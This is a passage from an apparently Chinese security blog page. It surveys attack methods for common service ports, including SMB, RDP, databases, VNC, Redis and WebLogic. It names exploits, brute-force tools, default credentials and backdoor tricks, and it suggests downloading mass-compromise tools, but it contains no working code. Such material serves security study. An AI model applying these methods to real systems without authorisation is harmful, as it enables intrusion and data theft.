href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a>过程中，网络上传输的用户和<a href="https://www.nkymbk.cn/tag/密码" target="_blank" rel="noopener">密码</a>都是以明文方式传送的，<a href="https://www.nkymbk.cn/tag/黑客" target="_blank" rel="noopener">黑客</a>可使用嗅探技术截获到此类<a href="https://www.nkymbk.cn/tag/密码" target="_blank" rel="noopener">密码</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）暴力破解技术是常用的技术，使用hydra,或者msf中telnet模块对其进行破解。``（2）在linux系统中一般采用SSH进行远程访问，传输的敏感数据都是经过加密的。而对于windows下的telnet来说是脆弱的，因为默认没有经过任何加密就在网络中进行传输。使用cain等嗅探工具可轻松截获远程登录密码。`</span><br></pre></td></tr></table></figure><p><strong>25/465端口渗透剖析</strong></p><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送<a href="https://www.nkymbk.cn/tag/钓鱼" target="_blank" rel="noopener">钓鱼</a>邮件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`默认端口：25（smtp）、465（smtps）``（1）爆破：弱口令``（2）未授权访问`</span><br></pre></td></tr></table></figure><p><strong>53端口渗透剖析</strong><br>53<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>是DNS<a href="https://www.nkymbk.cn/tag/域名" target="_blank" rel="noopener">域名</a><a href="https://www.nkymbk.cn/tag/服务器" target="_blank" rel="noopener">服务器</a>的通信<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>，通常用于<a href="https://www.nkymbk.cn/tag/域名" target="_blank" rel="noopener">域名</a>解析。也是网络中非常关键的<a href="https://www.nkymbk.cn/tag/服务器" target="_blank" rel="noopener">服务器</a>之一。这类<a href="https://www.nkymbk.cn/tag/服务器" target="_blank" rel="noopener">服务器</a>容易受到<a href="https://www.nkymbk.cn/tag/攻击" target="_blank" rel="noopener">攻击</a>。对于此<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>的<a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>，一般有三种方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）使用DNS远程溢出漏洞直接对其主机进行溢出攻击，成功后可直接获得系统权限。（https:``//www.seebug.org/vuldb/ssvid-96718）``（2）使用DNS欺骗攻击，可对DNS域名服务器进行欺骗，如果黑客再配合网页木马进行挂马攻击，无疑是一种杀伤力很强的攻击，黑客可不费吹灰之力就控制内网的大部分主机。这也是内网渗透惯用的技法之一。（https:``//baijiahao.baidu.com/s?id=1577362432987749706&amp;wfr=spider&amp;for=pc）``（3）拒绝服务攻击，利用拒绝服务攻击可快速的导致目标服务器运行缓慢，甚至网络瘫痪。如果使用拒绝服务攻击其DNS服务器。将导致用该服务器进行域名解析的用户无法正常上网。（http:``//www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml）（4）DNS劫持。（https://blog.csdn.net/qq_32447301/article/details/77542474）`</span><br></pre></td></tr></table></figure><p><strong>80端口渗透剖析</strong>80<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>通常提供web服务。目前<a href="https://www.nkymbk.cn/tag/黑客" target="_blank" rel="noopener">黑客</a>对80<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>的<a href="https://www.nkymbk.cn/tag/攻击" target="_blank" rel="noopener">攻击</a>典型是采用<a href="https://www.nkymbk.cn/tag/SQL" target="_blank" rel="noopener">SQL</a><a href="https://www.nkymbk.cn/tag/注入" target="_blank" rel="noopener">注入</a>的<a href="https://www.nkymbk.cn/tag/攻击" target="_blank" rel="noopener">攻击</a><a href="https://www.nkymbk.cn/tag/方法" target="_blank" rel="noopener">方法</a>，<a href="https://www.nkymbk.cn/tag/脚本" target="_blank" rel="noopener">脚本</a><a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>技术也是一项综合性极高的web<a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>技术，同时<a href="https://www.nkymbk.cn/tag/脚本" target="_blank" rel="noopener">脚本</a><a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>技术对80<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>也构成严重的威胁。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）对于windows2000的IIS5.0版本，黑客使用远程溢出直接对远程主机进行溢出攻击，成功后直接获得系统权限。``（2）对于windows2000中IIS5.0版本，黑客也尝试利用‘Microsoft IISCGI’文件名错误解码漏洞攻击。使用X-SCAN可直接探测到IIS漏洞。``（3）IIS写权限漏洞是由于IIS配置不当造成的安全问题，攻击者可向存在此类漏洞的服务器上传恶意代码，比如上传脚本木马扩大控制权限。``（4）普通的http封包是没有经过加密就在网络中传输的，这样就可通过嗅探类工具截取到敏感的数据。如使用Cain工具完成此类渗透。``（5）80端口的攻击，更多的是采用脚本渗透技术，利用web应用程序的漏洞进行渗透是目前很流行的攻击方式。``（6）对于渗透只开放80端口的服务器来说，难度很大。利用端口复用工具可解决此类技术难题。``（7）CC攻击效果不及DDOS效果明显，但是对于攻击一些小型web站点还是比较有用的。CC攻击可使目标站点运行缓慢，页面无法打开，有时还会爆出web程序的绝对路径。`</span><br></pre></td></tr></table></figure><p><strong>135端口渗透剖析</strong><br><a href="https://www.nkymbk.cn/tag/135" target="_blank" rel="noopener">135</a><a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>主要用于使用RPC协议并提供DCOM服务，通过RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用DCOM可以通过网络直接进行通信，能够跨包括HTTP协议在内的多种网络传输。同时这个<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>也爆出过不少<a href="https://www.nkymbk.cn/tag/漏洞" target="_blank" rel="noopener">漏洞</a>，最严重的就是缓冲区溢出<a href="https://www.nkymbk.cn/tag/漏洞" target="_blank" rel="noopener">漏洞</a>，曾经疯狂一时的‘冲击波’<a href="https://www.nkymbk.cn/tag/病毒" target="_blank" rel="noopener">病毒</a>就是利用这个<a href="https://www.nkymbk.cn/tag/漏洞" target="_blank" rel="noopener">漏洞</a>进行传播的。对于<a href="https://www.nkymbk.cn/tag/135" target="_blank" rel="noopener">135</a><a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>的<a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>，<a href="https://www.nkymbk.cn/tag/黑客" target="_blank" rel="noopener">黑客</a>的<a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a><a href="https://www.nkymbk.cn/tag/方法" target="_blank" rel="noopener">方法</a>为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）查找存在RPC溢出的主机，进行远程溢出攻击，直接获得系统权限。如用‘DSScan’扫描存在此漏洞的主机。对存在漏洞的主机可使用‘ms05011.exe’进行溢出，溢出成功后获得系统权限。（https:``//wenku.baidu.com/view/68b3340c79563c1ec5da710a.html）``（2）扫描存在弱口令的135主机，利用RPC远程过程调用开启telnet服务并登录telnet执行系统命令。系统弱口令的扫描一般使用hydra。对于telnet服务的开启可使用工具kali链接。（https:``//wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html）`</span><br></pre></td></tr></table></figure><p><strong>139/445端口渗透剖析</strong><br>139<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>是为‘Net<a href="https://www.nkymbk.cn/tag/BIOS" target="_blank" rel="noopener">BIOS</a> SessionService’提供的，主要用于提供windows文件和打印机共享以及UNIX中的Samba服务。<a href="https://www.nkymbk.cn/tag/445" target="_blank" rel="noopener">445</a><a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>也用于提供windows文件和打印机共享，在内网环境中使用的很广泛。这两个<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>同样属于重点<a href="https://www.nkymbk.cn/tag/攻击" target="_blank" rel="noopener">攻击</a>对象，139/<a href="https://www.nkymbk.cn/tag/445" target="_blank" rel="noopener">445</a><a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>曾出现过许多严重级别的<a href="https://www.nkymbk.cn/tag/漏洞" target="_blank" rel="noopener">漏洞</a>。下面剖析<a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>此类<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>的基本<a href="https://www.nkymbk.cn/tag/思路" target="_blank" rel="noopener">思路</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）对于开放139/445端口的主机，一般尝试利用溢出漏洞对远程主机进行溢出攻击，成功后直接获得系统权限。利用msf的ms-017永恒之蓝。（https:``//blog.csdn.net/qq_41880069/article/details/82908131）``（2）对于攻击只开放445端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’.可使用专用的445端口扫描器进行扫描。NS08067溢出工具对windows2003系统的溢出十分有效，工具基本使用参数在cmd下会有提示。（https:``//blog.csdn.net/god_7z1/article/details/6773652）``（3）对于开放139/445端口的主机，黑客一般使用IPC$进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得administrator账户的口令。（https:``//blog.warhut.cn/dmbj/145.html）``（4）对于开放139/445端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。`</span><br></pre></td></tr></table></figure><p><strong>1433端口渗透剖析</strong>1433是<a href="https://www.nkymbk.cn/tag/SQL" target="_blank" rel="noopener">SQL</a>Server默认的<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>，<a href="https://www.nkymbk.cn/tag/SQL" target="_blank" rel="noopener">SQL</a> Server服务使用两个<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>：tcp-1433、UDP-1434.其中1433用于供<a href="https://www.nkymbk.cn/tag/SQL" target="_blank" rel="noopener">SQL</a>Server对外提供服务，1434用于向请求者返回<a href="https://www.nkymbk.cn/tag/SQL" target="_blank" rel="noopener">SQL</a>Server使用了哪些TCP/<a href="https://www.nkymbk.cn/tag/IP" target="_blank" rel="noopener">IP</a><a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>。1433<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>通常遭到<a href="https://www.nkymbk.cn/tag/黑客" target="_blank" rel="noopener">黑客</a>的<a href="https://www.nkymbk.cn/tag/攻击" target="_blank" rel="noopener">攻击</a>，而且<a href="https://www.nkymbk.cn/tag/攻击" target="_blank" rel="noopener">攻击</a>的方式层出不穷。最严重的莫过于远程溢出<a href="https://www.nkymbk.cn/tag/漏洞" target="_blank" rel="noopener">漏洞</a>了，如由于<a href="https://www.nkymbk.cn/tag/SQL" target="_blank" rel="noopener">SQL</a>注射<a href="https://www.nkymbk.cn/tag/攻击" target="_blank" rel="noopener">攻击</a>的兴起，各类<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a>时刻面临着安全威胁。利用<a href="https://www.nkymbk.cn/tag/SQL" target="_blank" rel="noopener">SQL</a>注射技术对<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a>进行<a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>是目前比较流行的<a href="https://www.nkymbk.cn/tag/攻击" target="_blank" rel="noopener">攻击</a>方式，此类技术属于<a href="https://www.nkymbk.cn/tag/脚本" target="_blank" rel="noopener">脚本</a><a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>技术。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）对于开放1433端口的SQL Server2000的数据库服务器，黑客尝试使用远程溢出漏洞对主机进行溢出测试，成功后直接获得系统权限。（https:``//blog.csdn.net/gxj022/article/details/4593015）``（2）暴力破解技术是一项经典的技术。一般破解的对象都是SA用户。通过字典破解的方式很快破解出SA的密码。（https:``//blog.csdn.net/kali_linux/article/details/50499576）``（3）嗅探技术同样能嗅探到SQL Server的登录密码。``（4）由于脚本程序编写的不严密，例如，程序员对参数过滤不严等，这都会造成严重的注射漏洞。通过SQL注射可间接性的对数据库服务器进行渗透，通过调用一些存储过程执行系统命令。可以使用SQL综合利用工具完成。`</span><br></pre></td></tr></table></figure><p><strong>1521端口渗透剖析</strong>1521是大型<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a>Oracle的默认监听<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>，估计新手还对此<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>比较陌生，平时大家接触的比较多的是Access，M<a href="https://www.nkymbk.cn/tag/SS" target="_blank" rel="noopener">SS</a>QL以及MY<a href="https://www.nkymbk.cn/tag/SQL" target="_blank" rel="noopener">SQL</a>这三种<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a>。一般大型站点才会部署这种比较昂贵的<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a><a href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a>。对于<a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>这种比较复杂的<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a><a href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a>，<a href="https://www.nkymbk.cn/tag/黑客" target="_blank" rel="noopener">黑客</a>的<a href="https://www.nkymbk.cn/tag/思路" target="_blank" rel="noopener">思路</a>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）Oracle拥有非常多的默认用户名和密码，为了获得数据库系统的访问权限，破解数据库系统用户以及密码是黑客必须攻破的一道安全防线。``（2）SQL注射同样对Oracle十分有效，通过注射可获得数据库的敏感信息，包括管理员密码等。``（3）在注入点直接创建java，执行系统命令。（4）https:``//www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html`</span><br></pre></td></tr></table></figure><p>-————————————————————–<br>以上的<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a><a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>原理只是用作分析，现在网上有很多自动的<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a><a href="https://www.nkymbk.cn/tag/入侵" target="_blank" rel="noopener">入侵</a><a href="https://www.nkymbk.cn/tag/工具" target="_blank" rel="noopener">工具</a>，比如<a href="https://www.nkymbk.cn/tag/445" target="_blank" rel="noopener">445</a><a href="https://www.nkymbk.cn/tag/批量" target="_blank" rel="noopener">批量</a><a href="https://www.nkymbk.cn/tag/抓鸡" target="_blank" rel="noopener">抓鸡</a>器或者1433<a href="https://www.nkymbk.cn/tag/批量" target="_blank" rel="noopener">批量</a><a href="https://www.nkymbk.cn/tag/抓鸡" target="_blank" rel="noopener">抓鸡</a>器。大家有兴趣的可以去网上<a href="http://www.2cto.com/soft" target="_blank" rel="noopener">下载</a>试用。————————————————————</p><p><strong>2049端口渗透剖析</strong></p><p>NFS（Network File System）即网络文件<a href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a>，是FreeBSD支持的文件<a href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a>中的一种，它允许网络中的计算机之间通过TCP/<a href="https://www.nkymbk.cn/tag/IP" target="_blank" rel="noopener">IP</a>网络共享资源。在NFS的应用中，<a href="https://www.nkymbk.cn/tag/本地" target="_blank" rel="noopener">本地</a>NFS的客户端应用可以透明地读写位于远端NFS<a href="https://www.nkymbk.cn/tag/服务器" target="_blank" rel="noopener">服务器</a>上的文件，就像访问<a href="https://www.nkymbk.cn/tag/本地" target="_blank" rel="noopener">本地</a>文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留<a href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a>中的NFS服务<a href="https://www.nkymbk.cn/tag/配置" target="_blank" rel="noopener">配置</a>不当，则仍可能遭到恶意<a href="https://www.nkymbk.cn/tag/攻击" target="_blank" rel="noopener">攻击</a>者的利用。</p><p><strong>3306端口渗透剖析</strong></p><p>3306是MY<a href="https://www.nkymbk.cn/tag/SQL" target="_blank" rel="noopener">SQL</a><a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a>默认的监听<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>，通常部署在中型web<a href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a>中。在国内<a href="https://www.nkymbk.cn/tag/LAMP" target="_blank" rel="noopener">LAMP</a>的<a href="https://www.nkymbk.cn/tag/配置" target="_blank" rel="noopener">配置</a>是非常流行的，对于php+mysql构架的<a href="https://www.nkymbk.cn/tag/攻击" target="_blank" rel="noopener">攻击</a>也是属于比较热门的话题。mysql<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a>允许用户使用自定义函数功能，这使得<a href="https://www.nkymbk.cn/tag/黑客" target="_blank" rel="noopener">黑客</a>可编写恶意的自定义函数对<a href="https://www.nkymbk.cn/tag/服务器" target="_blank" rel="noopener">服务器</a>进行<a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>，最后取得<a href="https://www.nkymbk.cn/tag/服务器" target="_blank" rel="noopener">服务器</a>最高<a href="https://www.nkymbk.cn/tag/权限" target="_blank" rel="noopener">权限</a>。对于3306<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>的<a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>，<a href="https://www.nkymbk.cn/tag/黑客" target="_blank" rel="noopener">黑客</a>的<a href="https://www.nkymbk.cn/tag/方法" target="_blank" rel="noopener">方法</a>如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）由于管理者安全意识淡薄，通常管理密码设置过于简单，甚至为空口令。使用破解软件很容易破解此类密码，利用破解的密码登录远程mysql数据库，上传构造的恶意UDF自定义函数代码进行注册，通过调用注册的恶意函数执行系统命令。或者向web目录导出恶意的脚本程序，以控制整个web系统。``（2）功能强大的‘cain’同样支持对3306端口的嗅探，同时嗅探也是渗透思路的一种。``（3）SQL注入同样对mysql数据库威胁巨大，不仅可以获取数据库的敏感信息，还可使用load_file()函数读取系统的敏感配置文件或者从web数据库链接文件中获得root口令等，导出恶意代码到指定路径等。`</span><br></pre></td></tr></table></figure><p><strong>3389端口渗透剖析</strong><br>3389是windows远程桌面服务默认监听的<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>，管理员通过远程桌面对<a href="https://www.nkymbk.cn/tag/服务器" target="_blank" rel="noopener">服务器</a>进行维护，这给管理工作带来的极大的方便。通常此<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>也是<a href="https://www.nkymbk.cn/tag/黑客" target="_blank" rel="noopener">黑客</a>们较为感兴趣的<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>之一，利用它可对远程<a href="https://www.nkymbk.cn/tag/服务器" target="_blank" rel="noopener">服务器</a>进行控制，而且不需要另外安装额外的软件，实现<a href="https://www.nkymbk.cn/tag/方法" target="_blank" rel="noopener">方法</a>比较简单。当然这也是<a href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a>合法的服务，通常是不会被杀毒软件所查杀的。使用‘输入法<a href="https://www.nkymbk.cn/tag/漏洞" target="_blank" rel="noopener">漏洞</a>’进行<a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）对于windows2000的旧系统版本，使用‘输入法漏洞’进行渗透。``（2）cain是一款超级的渗透工具，同样支持对3389端口的嗅探。``（3）Shift粘滞键后门：5次shift后门``（4）社会工程学通常是最可怕的攻击技术，如果管理者的一切习惯和规律被黑客摸透的话，那么他管理的网络系统会因为他的弱点被渗透。（5）爆破3389端口。这里还是推荐使用hydra爆破工具。（6）ms12_020死亡蓝屏攻击。（https:``//www.cnblogs.com/R-Hacker/p/9178066.html）（7）https://www.cnblogs.com/backlion/p/9429738.html`</span><br></pre></td></tr></table></figure><p><strong>4899端口渗透剖析</strong>4899<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>是remoteadministrator远程控制软件默认监听的<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>，也就是平时常说的radmini影子。radmini目前支持TCP/<a href="https://www.nkymbk.cn/tag/IP" target="_blank" rel="noopener">IP</a>协议，应用十分广泛，在很多<a href="https://www.nkymbk.cn/tag/服务器" target="_blank" rel="noopener">服务器</a>上都会看到该款软件的影子。对于此软件的<a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>，<a href="https://www.nkymbk.cn/tag/思路" target="_blank" rel="noopener">思路</a>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）radmini同样存在不少弱口令的主机，通过专用扫描器可探测到此类存在漏洞的主机。``（2）radmini远控的连接密码和端口都是写入到注册表系统中的，通过使用webshell注册表读取功能可读取radmini在注册表的各项键值内容，从而破解加密的密码散列。`</span><br></pre></td></tr></table></figure><p><strong>5432端口渗透剖析</strong></p><p>Postgre<a href="https://www.nkymbk.cn/tag/SQL" target="_blank" rel="noopener">SQL</a>是一种特性非常齐全的自由软件的对象–关系型<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a>管理<a href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a>，可以说是目前世界上最先进，功能最<a href="https://www.nkymbk.cn/tag/强大" target="_blank" rel="noopener">强大</a>的自由<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a>管理<a href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a>。包括kali<a href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a>中<a href="https://www.nkymbk.cn/tag/msf" target="_blank" rel="noopener">msf</a>也使用这个<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a>；<a href="https://www.nkymbk.cn/tag/浅谈" target="_blank" rel="noopener">浅谈</a>postgresql<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a><a href="https://www.nkymbk.cn/tag/攻击" target="_blank" rel="noopener">攻击</a>技术 大部分关于它的<a href="https://www.nkymbk.cn/tag/攻击" target="_blank" rel="noopener">攻击</a>依旧是sql<a href="https://www.nkymbk.cn/tag/注入" target="_blank" rel="noopener">注入</a>，所以<a href="https://www.nkymbk.cn/tag/注入" target="_blank" rel="noopener">注入</a>才是<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a>不变的话题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）爆破：弱口令：postgres postgres``（2）缓冲区溢出：CVE-2014-2669。（http:``//drops.xmd5.com/static/drops/tips-6449.html）（3）远程代码执行：CVE-2018-1058。（https://www.secpulse.com/archives/69153.html）`</span><br></pre></td></tr></table></figure><p><strong>5631端口渗透剖析</strong>5631<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>是著名远程控制软件pcanywhere的默认监听<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>，同时也是世界领先的远程控制软件。利用此软件，用户可以有效管理计算机并快速解决技术支持问题。由于软件的设计缺陷，使得<a href="https://www.nkymbk.cn/tag/黑客" target="_blank" rel="noopener">黑客</a>可随意<a href="http://www.2cto.com/soft" target="_blank" rel="noopener">下载</a>保存连接<a href="https://www.nkymbk.cn/tag/密码" target="_blank" rel="noopener">密码</a>的*.cif文件，通过专用<a href="https://www.nkymbk.cn/tag/破解" target="_blank" rel="noopener">破解</a>软件进行<a href="https://www.nkymbk.cn/tag/破解" target="_blank" rel="noopener">破解</a>。这些操作都必须在拥有一定<a href="https://www.nkymbk.cn/tag/权限" target="_blank" rel="noopener">权限</a>下才可完成，至少通过<a href="https://www.nkymbk.cn/tag/脚本" target="_blank" rel="noopener">脚本</a><a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>获得一个webshell。通常这些操作在<a href="https://www.nkymbk.cn/tag/黑客" target="_blank" rel="noopener">黑客</a>界被称为pcanywhere<a href="https://www.nkymbk.cn/tag/提权" target="_blank" rel="noopener">提权</a>技术。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`PcAnyWhere提权。（https:``//blog.csdn.net/Fly_hps/article/details/80377199）`</span><br></pre></td></tr></table></figure><p><strong>5900端口渗透剖析</strong><br>5900<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>是优秀远程控制软件VNC的默认监听<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>，此软件由著名的AT&amp;T的欧洲研究实验室<a href="https://www.nkymbk.cn/tag/开发" target="_blank" rel="noopener">开发</a>的。VNC是在基于unix和linux操作<a href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a>的免费的开放<a href="http://www.2cto.com/ym" target="_blank" rel="noopener">源码</a>软件，远程控制能力<a href="https://www.nkymbk.cn/tag/强大" target="_blank" rel="noopener">强大</a>，高效实用，其性能可以和<a href="http://www.2cto.com/os/windows/" target="_blank" rel="noopener">windows</a>和MAC中的任何一款控制软件媲美。对于该<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>的<a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>，<a href="https://www.nkymbk.cn/tag/思路" target="_blank" rel="noopener">思路</a>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）VNC软件存在密码验证绕过漏洞，此高危漏洞可以使得恶意攻击者不需要密码就可以登录到一个远程系统。``（2）cain同样支持对VNC的嗅探，同时支持端口修改。``（3）VNC的配置信息同样被写入注册表系统中，其中包括连接的密码和端口。利用webshell的注册表读取功能进行读取加密算法，然后破解。（4）VNC拒绝服务攻击（CVE-2015-5239）。（http:``//blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html）（5）VNC权限提升（CVE-2013-6886）。`</span><br></pre></td></tr></table></figure><p><strong>6379端口渗透剖析</strong></p><p>Redis是一个<a href="https://www.nkymbk.cn/tag/开源" target="_blank" rel="noopener">开源</a>的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a>。关于这个<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a>这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）爆破：弱口令``（2）未授权访问+配合ssh key提权。（http:``//www.alloyteam.com/2017/07/12910/）`</span><br></pre></td></tr></table></figure><p><strong>7001/7002端口渗透剖析</strong></p><p>7001/7002通常是weblogic中间件<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic``（2）管理后台部署 war 后门``（3）SSRF``（4）反序列化漏洞``（5）weblogic_uachttps:``//github.com/vulhub/vulhub/tree/master/weblogic/ssrfhttps://bbs.pediy.com/thread-224954.htmhttps://fuping.site/2017/06.05/Weblogic-Vulnerability-Verification/https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html`</span><br></pre></td></tr></table></figure><p><strong>8080端口渗透剖析</strong><br>8080<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>通常是apache_<a href="https://www.nkymbk.cn/tag/Tomcat" target="_blank" rel="noopener">Tomcat</a><a href="https://www.nkymbk.cn/tag/服务器" target="_blank" rel="noopener">服务器</a>默认监听<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>，apache是世界使用排名第一的<a href="https://www.nkymbk.cn/tag/web服务器" target="_blank" rel="noopener">web服务器</a>。国内很多大型<a href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a>都是使用apache<a href="https://www.nkymbk.cn/tag/服务器" target="_blank" 